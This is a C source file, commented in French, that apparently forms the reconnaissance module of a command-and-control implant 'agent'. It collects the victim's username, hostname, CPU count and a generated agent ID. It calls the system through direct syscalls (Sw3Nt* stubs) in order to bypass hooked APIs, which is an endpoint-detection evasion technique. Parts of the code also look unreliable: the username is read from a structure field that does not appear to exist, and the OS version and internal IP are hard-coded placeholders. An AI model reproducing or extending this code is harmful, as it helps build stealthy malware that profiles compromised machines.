/*
 * gather.c - System information gathering with syscalls
 * Utilise PEB, registre syscalls, et NtQuerySystemInformation
 */

#include "gather.h"
#include "../core/unicode.h"
#include "../../syscalls/syscalls.h"
#include <string.h>
#include <stdio.h>

// Helper pour RtlInitUnicodeString (ntdll, pas hookée)
typedef void (NTAPI *RtlInitUnicodeString_t)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

static RtlInitUnicodeString_t pRtlInitUnicodeString = NULL;

// Initialiser RtlInitUnicodeString
static void init_rtl_functions(void) {
    HMODULE hNtdll;

    if (pRtlInitUnicodeString != NULL) {
        return;
    }

    hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        return;
    }

    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wcast-function-type"
    pRtlInitUnicodeString = (RtlInitUnicodeString_t)
        GetProcAddress(hNtdll, "RtlInitUnicodeString");
    #pragma GCC diagnostic pop
}

// Obtenir le PEB via intrinsic x64
static PPEB get_peb(void) {
    #ifdef _WIN64
        return (PPEB)__readgsqword(0x60);
    #else
        return (PPEB)__readfsdword(0x30);
    #endif
}

// Récupérer le username depuis le PEB
static void get_username_from_peb(char* output, size_t max_len) {
    PPEB peb;
    PRTL_USER_PROCESS_PARAMETERS params;
    UNICODE_STRING* username;

    if (output == NULL || max_len == 0) {
        return;
    }

    output[0] = '\0';

    peb = get_peb();
    if (peb == NULL || peb->ProcessParameters == NULL) {
        strcpy(output, "unknown");
        return;
    }

    params = peb->ProcessParameters;
    username = &params->UserName;

    if (username->Buffer != NULL && username->Length > 0) {
        unicode_to_ansi(username, output, max_len);
    } else {
        strcpy(output, "unknown");
    }
}

// Récupérer le hostname depuis le registre avec syscalls
static void get_hostname_from_registry(char* output, size_t max_len) {
    HANDLE hKey = NULL;
    UNICODE_STRING keyPath, valueName;
    OBJECT_ATTRIBUTES objAttr;
    NTSTATUS status;
    UCHAR buffer[256];
    PKEY_VALUE_PARTIAL_INFORMATION kvpi;
    ULONG resultLength;

    if (output == NULL || max_len == 0) {
        return;
    }

    output[0] = '\0';

    init_rtl_functions();
    if (pRtlInitUnicodeString == NULL) {
        strcpy(output, "unknown");
        return;
    }

    // Ouvrir la clé de registre
    // \Registry\Machine\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName
    pRtlInitUnicodeString(&keyPath,
        L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName");

    InitializeObjectAttributes(&objAttr, &keyPath, 0, NULL, NULL);

    status = Sw3NtOpenKey(&hKey, KEY_READ, &objAttr);
    if (!NT_SUCCESS(status)) {
        strcpy(output, "unknown");
        return;
    }

    // Lire la valeur "ComputerName"
    pRtlInitUnicodeString(&valueName, L"ComputerName");

    kvpi = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;
    memset(buffer, 0, sizeof(buffer));

    status = Sw3NtQueryValueKey(hKey, &valueName, KeyValuePartialInformation,
                                 kvpi, sizeof(buffer), &resultLength);

    if (NT_SUCCESS(status) && kvpi->DataLength > 0) {
        // Convertir de WCHAR* vers char*
        WCHAR* wideHostname = (WCHAR*)kvpi->Data;
        size_t len = kvpi->DataLength / sizeof(WCHAR);
        if (len >= max_len) len = max_len - 1;

        for (size_t i = 0; i < len; i++) {
            output[i] = (char)wideHostname[i];
        }
        output[len] = '\0';
    } else {
        strcpy(output, "unknown");
    }

    Sw3NtClose(hKey);
}

// Récupérer la version de l'OS avec NtQuerySystemInformation
static void get_os_version(char* output, size_t max_len) {
    SYSTEM_BASIC_INFORMATION sbi;
    NTSTATUS status;
    ULONG returnLength;

    if (output == NULL || max_len == 0) {
        return;
    }

    memset(&sbi, 0, sizeof(sbi));

    status = Sw3NtQuerySystemInformation(SystemBasicInformation, &sbi, sizeof(sbi), &returnLength);

    if (NT_SUCCESS(status)) {
        // Note: SYSTEM_BASIC_INFORMATION ne donne pas directement la version Windows
        // Pour une version complète, il faudrait SystemInformation class 45 (SystemKernelDebuggerInformation)
        // ou parser le registre. Pour simplifier, on met juste "Windows 10/11"
        snprintf(output, max_len, "Windows 10/11 (%d cores)", sbi.NumberOfProcessors);
    } else {
        strcpy(output, "Windows Unknown");
    }
}

// Générer un UUID simple : hostname-username-timestamp
static void generate_agent_id(const char* hostname, const char* username, char* output, size_t max_len) {
    LARGE_INTEGER systemTime;
    NTSTATUS status;

    if (output == NULL || max_len == 0) {
        return;
    }

    status = Sw3NtQuerySystemTime(&systemTime);

    if (NT_SUCCESS(status)) {
        snprintf(output, max_len, "%s-%s-%llx",
                 hostname,
                 username,
                 (unsigned long long)systemTime.QuadPart);
    } else {
        snprintf(output, max_len, "%s-%s-0", hostname, username);
    }
}

// Fonction principale - collecter toutes les infos système
void get_system_info(AgentInfo* info) {
    char hostname[SMALL_BUF];
    char username[SMALL_BUF];

    if (info == NULL) {
        return;
    }

    // 1. Username depuis PEB
    get_username_from_peb(username, sizeof(username));
    strncpy(info->username, username, sizeof(info->username) - 1);
    info->username[sizeof(info->username) - 1] = '\0';

    // 2. Hostname depuis registre
    get_hostname_from_registry(hostname, sizeof(hostname));
    strncpy(info->hostname, hostname, sizeof(info->hostname) - 1);
    info->hostname[sizeof(info->hostname) - 1] = '\0';

    // 3. Version OS
    get_os_version(info->os_version, sizeof(info->os_version));

    // 4. IP interne (simplifié - complexe sans iphlpapi.dll)
    strcpy(info->internal_ip, "0.0.0.0");

    // 5. Agent ID (UUID simple)
    generate_agent_id(hostname, username, info->agent_id, sizeof(info->agent_id));
}
